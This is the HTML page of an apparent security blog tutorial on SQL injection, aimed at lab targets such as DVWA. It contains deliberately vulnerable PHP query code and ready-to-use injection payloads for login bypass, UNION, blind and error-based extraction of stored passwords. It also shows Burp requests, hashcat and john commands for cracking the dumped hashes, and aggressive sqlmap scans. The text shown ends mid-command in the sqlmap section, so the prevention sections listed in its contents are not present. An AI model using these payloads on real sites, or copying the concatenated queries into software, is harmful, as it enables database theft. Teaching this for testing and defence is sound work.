<!doctype html><html lang=en dir=auto data-theme=dark><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="noindex, nofollow"><title>SQL Injection Basics and Prevention | Hri7ik H4cks</title><meta name=keywords content><meta name=description content=" SQL Injection Basics and Prevention"><meta name=author content="Hrithik"><link rel=canonical href=http://localhost:1313/posts/sql-injection-basics-and-prevention/><link crossorigin=anonymous href=/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css integrity="sha256-NDzEgLn/yPBMy+XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/sql-injection-basics-and-prevention/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script>localStorage.getItem("pref-theme")==="light"&&(document.querySelector("html").dataset.theme="light")</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Hri7ik H4cks (Alt + H)"><img src=http://localhost:1313/favicon.ico alt aria-label=logo height=35>Hri7ik H4cks</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/posts title=Posts><span>Posts</span></a></li><li><a href=http://localhost:1313/about title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">SQL Injection Basics and Prevention</h1><div class=post-description>SQL Injection Basics and Prevention</div><div class=post-meta><span title='2025-11-02 10:28:39 +0000 UTC'>November 2, 2025</span>&nbsp;¬∑&nbsp;<span>11 min</span>&nbsp;¬∑&nbsp;<span>2299 words</span>&nbsp;¬∑&nbsp;<span>Hrithik</span>&nbsp;|&nbsp;<span>
<a href=https://github.com/yourusername/yourblogrepo/edit/main/content rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></span></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#sql-injection-basics-and-prevention aria-label="SQL Injection Basics and Prevention">SQL Injection Basics and Prevention</a><ul><li><a href=#introduction aria-label=Introduction>Introduction</a><ul><li><a href=#what-youll-learn aria-label="What You&rsquo;ll Learn">What You&rsquo;ll Learn</a></li><li><a href=#use-cases aria-label="Use Cases">Use Cases</a></li></ul></li><li><a href=#prerequisites aria-label=Prerequisites>Prerequisites</a><ul><li><a href=#tool-prerequisites aria-label="Tool Prerequisites">Tool Prerequisites</a></li></ul></li><li><a href=#step-by-step-guide aria-label="Step-by-Step Guide">Step-by-Step Guide</a><ul><li><a href=#step-1-understanding-sql-injection aria-label="Step 1: Understanding SQL Injection">Step 1: Understanding SQL Injection</a></li><li><a href=#step-2-setting-up-a-test-environment aria-label="Step 2: Setting Up a Test Environment">Step 2: Setting Up a Test Environment</a></li><li><a href=#step-3-basic-sql-injection-types aria-label="Step 3: Basic SQL Injection Types">Step 3: Basic SQL Injection Types</a><ul><li><a href=#type-1-union-based-sql-injection aria-label="Type 1: Union-Based SQL Injection">Type 1: Union-Based SQL Injection</a></li><li><a href=#type-2-boolean-based-blind-sql-injection aria-label="Type 2: Boolean-Based Blind SQL Injection">Type 2: Boolean-Based Blind SQL Injection</a></li><li><a href=#type-3-time-based-blind-sql-injection aria-label="Type 3: Time-Based Blind SQL Injection">Type 3: Time-Based Blind SQL Injection</a></li><li><a href=#type-4-error-based-sql-injection aria-label="Type 4: Error-Based SQL Injection">Type 4: Error-Based SQL Injection</a></li></ul></li><li><a href=#step-4-manual-exploitation-example aria-label="Step 4: Manual Exploitation Example">Step 4: Manual Exploitation Example</a></li><li><a href=#step-5-automated-exploitation-with-sqlmap aria-label="Step 5: Automated Exploitation with SQLMap">Step 5: Automated Exploitation with SQLMap</a></li><li><a href=#step-6-sql-injection-in-different-contexts aria-label="Step 6: SQL Injection in Different Contexts">Step 6: SQL Injection in Different Contexts</a><ul><li><a href=#insert-statements aria-label="Insert Statements">Insert Statements</a></li><li><a href=#update-statements aria-label="Update Statements">Update Statements</a></li><li><a href=#delete-statements aria-label="Delete Statements">Delete Statements</a></li></ul></li><li><a href=#step-7-prevention-techniques aria-label="Step 7: Prevention Techniques">Step 7: Prevention Techniques</a><ul><li><a href=#method-1-prepared-statements-parameterized-queries aria-label="Method 1: Prepared Statements (Parameterized Queries)">Method 1: Prepared Statements (Parameterized Queries)</a></li><li><a href=#method-2-stored-procedures aria-label="Method 2: Stored Procedures">Method 2: Stored Procedures</a></li><li><a href=#method-3-input-validation aria-label="Method 3: Input Validation">Method 3: Input Validation</a></li><li><a href=#method-4-escaping-least-preferred aria-label="Method 4: Escaping (Least Preferred)">Method 4: Escaping (Least Preferred)</a></li></ul></li><li><a href=#step-8-advanced-prevention-techniques aria-label="Step 8: Advanced Prevention Techniques">Step 8: Advanced Prevention Techniques</a><ul><li><a href=#principle-of-least-privilege aria-label="Principle of Least Privilege">Principle of Least Privilege</a></li><li><a href=#web-application-firewall-waf aria-label="Web Application Firewall (WAF)">Web Application Firewall (WAF)</a></li><li><a href=#database-activity-monitoring aria-label="Database Activity Monitoring">Database Activity Monitoring</a></li></ul></li><li><a href=#step-9-testing-for-sql-injection aria-label="Step 9: Testing for SQL Injection">Step 9: Testing for SQL Injection</a></li></ul></li><li><a href=#best-practices aria-label="Best Practices">Best Practices</a></li><li><a href=#common-mistakes aria-label="Common Mistakes">Common Mistakes</a><ul><li><a href=#mistake-2-relying-only-on-input-escaping aria-label="Mistake 2: Relying Only on Input Escaping">Mistake 2: Relying Only on Input Escaping</a></li><li><a href=#mistake-3-over-permissive-database-users aria-label="Mistake 3: Over-Permissive Database Users">Mistake 3: Over-Permissive Database Users</a></li></ul></li><li><a href=#troubleshooting aria-label=Troubleshooting>Troubleshooting</a><ul><li><a href=#q-can-i-use-stored-procedures-instead-of-prepared-statements aria-label="Q: Can I use stored procedures instead of prepared statements?">Q: Can I use stored procedures instead of prepared statements?</a></li><li><a href=#q-do-orms-object-relational-mappers-prevent-sql-injection aria-label="Q: Do ORMs (Object-Relational Mappers) prevent SQL injection?">Q: Do ORMs (Object-Relational Mappers) prevent SQL injection?</a></li><li><a href=#q-what-about-nosql-databases aria-label="Q: What about NoSQL databases?">Q: What about NoSQL databases?</a></li></ul></li><li><a href=#hands-on-exercise aria-label="Hands-On Exercise">Hands-On Exercise</a><ul><li><a href=#exercise-tasks aria-label="Exercise Tasks">Exercise Tasks</a></li><li><a href=#expected-results aria-label="Expected Results">Expected Results</a></li></ul></li><li><a href=#conclusion aria-label=Conclusion>Conclusion</a><ul><li><a href=#next-steps aria-label="Next Steps">Next Steps</a></li><li><a href=#additional-resources aria-label="Additional Resources">Additional Resources</a></li><li><a href=#key-takeaways aria-label="Key Takeaways">Key Takeaways</a></li><li><a href=#tags aria-label=Tags>Tags</a></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=sql-injection-basics-and-prevention>SQL Injection Basics and Prevention<a hidden class=anchor aria-hidden=true href=#sql-injection-basics-and-prevention>#</a></h1><div class="callout callout-info"><div class=callout-title>Tutorial Information</div>**Category:** Web Application Security
**Difficulty:** Intermediate
**Prerequisites:** Basic SQL knowledge, understanding of web applications
**Estimated Time:** 2 hours</div>## üìã Table of Contents<ul><li><a href=#introduction>Introduction</a></li><li><a href=#prerequisites>Prerequisites</a></li><li><a href=#step-by-step-guide>Step-by-Step Guide</a></li><li><a href=#best-practices>Best Practices</a></li><li><a href=#common-mistakes>Common Mistakes</a></li><li><a href=#troubleshooting>Troubleshooting</a></li><li><a href=#conclusion>Conclusion</a></li></ul><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>SQL Injection (SQLi) is one of the oldest and most dangerous web application vulnerabilities. It occurs when user input is improperly sanitized and directly concatenated into SQL queries, allowing attackers to manipulate database operations, extract sensitive data, and even execute administrative operations.</p><p>This tutorial provides hands-on examples of SQL injection attacks and teaches defensive coding techniques to prevent them.</p><h3 id=what-youll-learn>What You&rsquo;ll Learn<a hidden class=anchor aria-hidden=true href=#what-youll-learn>#</a></h3><p>By the end of this tutorial, you&rsquo;ll be able to:</p><ul><li>Understand how SQL injection vulnerabilities arise</li><li>Identify and exploit basic SQL injection flaws</li><li>Recognize different types of SQL injection attacks</li><li>Implement parameterized queries (prepared statements)</li><li>Use stored procedures and input validation</li><li>Detect and prevent SQL injection in your applications</li><li>Test applications for SQL injection vulnerabilities</li></ul><h3 id=use-cases>Use Cases<a hidden class=anchor aria-hidden=true href=#use-cases>#</a></h3><p>This tutorial is valuable for:</p><ul><li>Web application security testing</li><li>Secure coding practices</li><li>Code review and vulnerability assessment</li><li>Incident response for database breaches</li><li>DevSecOps integration</li></ul><div class="callout callout-danger"><div class=callout-title>‚ö†Ô∏è Legal & Ethical Notice</div>All techniques described in this tutorial should only be used on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical. Use these skills responsibly and in accordance with applicable laws and regulations. The author and website owners are not responsible for any misuse of this information.</div><h2 id=prerequisites>Prerequisites<a hidden class=anchor aria-hidden=true href=#prerequisites>#</a></h2><div class="callout callout-warning"><div class=callout-title>Important</div>Before starting this tutorial, ensure you have the following:</div>### Knowledge Prerequisites<ul><li>Basic understanding of SQL syntax (SELECT, INSERT, UPDATE, DELETE)</li><li>Familiarity with web applications and HTTP requests</li><li>Understanding of server-side programming (PHP, Java, Python, etc.)</li><li>Knowledge of relational databases (MySQL, PostgreSQL, SQL Server)</li></ul><h3 id=tool-prerequisites>Tool Prerequisites<a hidden class=anchor aria-hidden=true href=#tool-prerequisites>#</a></h3><div class="callout callout-success"><div class=callout-title>Required Tools</div>- [SQLi-Lab](https://github.com/sunnyneharekar/sqlivuln) (vulnerable web application)
- [Burp Suite Community](https://portswigger.net/burp/communitydownload)
- [SQLMap](https://sqlmap.org/) (automated SQLi testing)
- [DVWA](https://github.com/digininja/DVWA) (Damn Vulnerable Web App)
- Database client (MySQL, PostgreSQL, or SQLite)</div>### System Prerequisites<ul><li>Web server (Apache/Nginx) with PHP support</li><li>Database server (MySQL 5.7+ or equivalent)</li><li>Browser with developer tools</li><li>Terminal access for running tools</li></ul><h2 id=step-by-step-guide>Step-by-Step Guide<a hidden class=anchor aria-hidden=true href=#step-by-step-guide>#</a></h2><h3 id=step-1-understanding-sql-injection>Step 1: Understanding SQL Injection<a hidden class=anchor aria-hidden=true href=#step-1-understanding-sql-injection>#</a></h3><p>SQL injection occurs when an attacker can insert malicious SQL code into application queries through user input.</p><p><strong>Vulnerable Code Pattern:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Vulnerable: Direct concatenation
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$username <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;username&#39;</span>];
</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;password&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username=&#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39; AND password=&#39;</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($connection, $query);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p><strong>Attack Example:</strong></p><pre tabindex=0><code>Username: admin&#39; --
Password: anything
</code></pre><p>This transforms the query into:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> users <span style=color:#66d9ef>WHERE</span> username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span> <span style=color:#75715e>--&#39; AND password=&#39;anything&#39;
</span></span></span></code></pre></div><p>The <code>--</code> comments out the password check!</p><h3 id=step-2-setting-up-a-test-environment>Step 2: Setting Up a Test Environment<a hidden class=anchor aria-hidden=true href=#step-2-setting-up-a-test-environment>#</a></h3><p><strong>Using Docker (Recommended):</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Pull SQLi-Lab docker image</span>
</span></span><span style=display:flex><span>docker pull ismisepaul/securityshepherd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Or install manually</span>
</span></span><span style=display:flex><span>git clone https://github.com/sunnyneharekar/sqlivuln.git
</span></span><span style=display:flex><span>cd sqlivuln
</span></span><span style=display:flex><span>./install.sh
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Start Apache and MySQL</span>
</span></span><span style=display:flex><span>sudo systemctl start apache2
</span></span><span style=display:flex><span>sudo systemctl start mysql
</span></span></code></pre></div><p><strong>DVWA Setup:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Install DVWA</span>
</span></span><span style=display:flex><span>git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
</span></span><span style=display:flex><span>chmod -R <span style=color:#ae81ff>755</span> /var/www/html/dvwa
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Configure database</span>
</span></span><span style=display:flex><span>mysql -u root -p
</span></span><span style=display:flex><span>CREATE DATABASE dvwa;
</span></span><span style=display:flex><span>CREATE USER <span style=color:#e6db74>&#39;dvwa&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span> IDENTIFIED BY <span style=color:#e6db74>&#39;password&#39;</span>;
</span></span><span style=display:flex><span>GRANT ALL PRIVILEGES ON dvwa.* TO <span style=color:#e6db74>&#39;dvwa&#39;</span>@<span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span></code></pre></div><h3 id=step-3-basic-sql-injection-types>Step 3: Basic SQL Injection Types<a hidden class=anchor aria-hidden=true href=#step-3-basic-sql-injection-types>#</a></h3><h4 id=type-1-union-based-sql-injection>Type 1: Union-Based SQL Injection<a hidden class=anchor aria-hidden=true href=#type-1-union-based-sql-injection>#</a></h4><p>The most common type, allowing data extraction using UNION SELECT.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Vulnerable search query
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$search <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;search&#39;</span>];
</span></span><span style=display:flex><span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM products WHERE name LIKE &#39;%</span><span style=color:#e6db74>$search</span><span style=color:#e6db74>%&#39;&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation Steps:</strong></p><ol><li><strong>Identify column count:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; ORDER BY 1--
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;</span> ORDER BY 2--
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&#39;</span> ORDER BY 3--
</span></span><span style=display:flex><span><span style=color:#75715e># Keep going until you get an error</span>
</span></span></code></pre></div><ol start=2><li><strong>Extract data using UNION:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; UNION SELECT 1,2,3--
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;</span> UNION SELECT username,password,3 FROM users--
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&#39;</span> UNION SELECT null,username,password FROM users--
</span></span></code></pre></div><ol start=3><li><strong>Database enumeration:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#e6db74>&#39; UNION SELECT version(),user(),database()--
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;</span> UNION SELECT table_name,column_name,1 FROM information_schema.columns WHERE table_schema<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;dvwa&#39;</span>--
</span></span></code></pre></div><h4 id=type-2-boolean-based-blind-sql-injection>Type 2: Boolean-Based Blind SQL Injection<a hidden class=anchor aria-hidden=true href=#type-2-boolean-based-blind-sql-injection>#</a></h4><p>When there&rsquo;s no visible output, use true/false conditions.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// No output displayed, only True/False results
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE id=&#39;</span><span style=color:#e6db74>$id</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($connection, $query);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mysqli_num_rows</span>($result) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;User exists&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># True condition (user exists)</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND 1<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># False condition (user doesn&#39;t exist)</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND 1<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extract data character by character</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND SUBSTRING<span style=color:#f92672>((</span>SELECT password FROM users WHERE username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>)</span>,1,1<span style=color:#f92672>)=</span><span style=color:#e6db74>&#39;a&#39;</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND SUBSTRING<span style=color:#f92672>((</span>SELECT password FROM users WHERE username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>)</span>,1,1<span style=color:#f92672>)=</span><span style=color:#e6db74>&#39;b&#39;</span>
</span></span></code></pre></div><p><strong>Automated with SQLMap:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://target.com/page.php?id=1&#34;</span> --batch --crawl<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span></code></pre></div><h4 id=type-3-time-based-blind-sql-injection>Type 3: Time-Based Blind SQL Injection<a hidden class=anchor aria-hidden=true href=#type-3-time-based-blind-sql-injection>#</a></h4><p>When there&rsquo;s no output, use time delays to infer information.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Different response times for true/false
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE username=&#39;</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Force delay if condition is true</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND IF<span style=color:#f92672>(</span>1<span style=color:#f92672>=</span>1,SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>,0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extract data using delays</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND IF<span style=color:#f92672>(</span>SUBSTRING<span style=color:#f92672>((</span>SELECT password FROM users WHERE username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>)</span>,1,1<span style=color:#f92672>)=</span><span style=color:#e6db74>&#39;a&#39;</span>,SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>,0<span style=color:#f92672>)</span>
</span></span></code></pre></div><h4 id=type-4-error-based-sql-injection>Type 4: Error-Based SQL Injection<a hidden class=anchor aria-hidden=true href=#type-4-error-based-sql-injection>#</a></h4><p>Force database to reveal information through error messages.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// Error messages revealed
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$query <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;SELECT * FROM users WHERE id=</span><span style=color:#e6db74>$id</span><span style=color:#e6db74>&#34;</span>;
</span></span></code></pre></div><p><strong>Exploitation:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># MySQL error-based</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND EXTRACTVALUE<span style=color:#f92672>(</span>1,CONCAT<span style=color:#f92672>(</span>0x7e,<span style=color:#f92672>(</span>SELECT password FROM users WHERE username<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>)</span>,0x7e<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># PostgreSQL error-based</span>
</span></span><span style=display:flex><span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> AND <span style=color:#f92672>(</span>SELECT CAST<span style=color:#f92672>(</span>password AS numeric<span style=color:#f92672>)</span> FROM users LIMIT 1<span style=color:#f92672>)=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><h3 id=step-4-manual-exploitation-example>Step 4: Manual Exploitation Example<a hidden class=anchor aria-hidden=true href=#step-4-manual-exploitation-example>#</a></h3><p>Let&rsquo;s exploit DVWA SQL Injection (Medium level):</p><ol><li><strong>Send request to Burp Repeater:</strong></li></ol><pre tabindex=0><code>POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: localhost
Cookie: security=medium; PHPSESSID=abc123

id=1&amp;Submit=Submit
</code></pre><ol start=2><li><strong>Test for injection:</strong></li></ol><pre tabindex=0><code>id=1&#39;&amp;Submit=Submit
# Expected: SQL error (or no result)
</code></pre><ol start=3><li><strong>Identify column count:</strong></li></ol><pre tabindex=0><code>id=1&#39; ORDER BY 2-- &amp;Submit=Submit
id=1&#39; ORDER BY 3-- &amp;Submit=Submit
# When you get error, you&#39;ve found the column count
</code></pre><ol start=4><li><strong>Extract database information:</strong></li></ol><pre tabindex=0><code>id=1&#39; UNION SELECT 1,2-- &amp;Submit=Submit
id=1&#39; UNION SELECT user(),database(),version()-- &amp;Submit=Submit
</code></pre><ol start=5><li><strong>Extract users table:</strong></li></ol><pre tabindex=0><code>id=1&#39; UNION SELECT user,password FROM users-- &amp;Submit=Submit
</code></pre><ol start=6><li><strong>Crack passwords:</strong></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Using hashcat or john the ripper</span>
</span></span><span style=display:flex><span>hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>0</span> hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>john hash.txt
</span></span></code></pre></div><h3 id=step-5-automated-exploitation-with-sqlmap>Step 5: Automated Exploitation with SQLMap<a hidden class=anchor aria-hidden=true href=#step-5-automated-exploitation-with-sqlmap>#</a></h3><p><strong>Basic scan:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://dvwa.local/vulnerabilities/sqli/?id=1&amp;Submit=Submit&#34;</span> --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;security=medium; PHPSESSID=abc&#34;</span>
</span></span></code></pre></div><p><strong>Comprehensive scan:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://dvwa.local/vulnerabilities/sqli/&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;id=1&amp;Submit=Submit&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --cookie<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;security=medium; PHPSESSID=abc&#34;</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --batch <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --crawl<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --threads<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> <span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>       --dbms<span style=color:#f92672>=</span>mysql
</span></span></code></pre></div><p><strong>Extract data:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sqlmap -u <span style=color:#e6db74>&#34;http://dvwa.local/vulnerabilities/sqli/&#34;</span> <span style=color:#ae81ff>\
